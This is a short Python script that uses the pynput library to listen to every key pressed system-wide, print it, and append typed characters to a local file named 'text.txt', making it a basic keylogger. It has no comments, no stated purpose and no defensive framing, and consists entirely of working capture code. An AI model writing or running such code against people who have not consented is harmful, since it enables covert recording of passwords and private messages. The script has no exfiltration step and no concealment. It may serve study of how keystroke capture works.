from pynput import keyboard


def keyPress(key):
    print(str(key))
    with open('text.txt', 'a', encoding='utf-8') as logKey:
        try:
            char = key.char
            logKey.write(char)
        except:
            print('Error while getting char')


if __name__ == '__main__':
    listener = keyboard.Listener(on_press=keyPress)
    listener.start()
    input()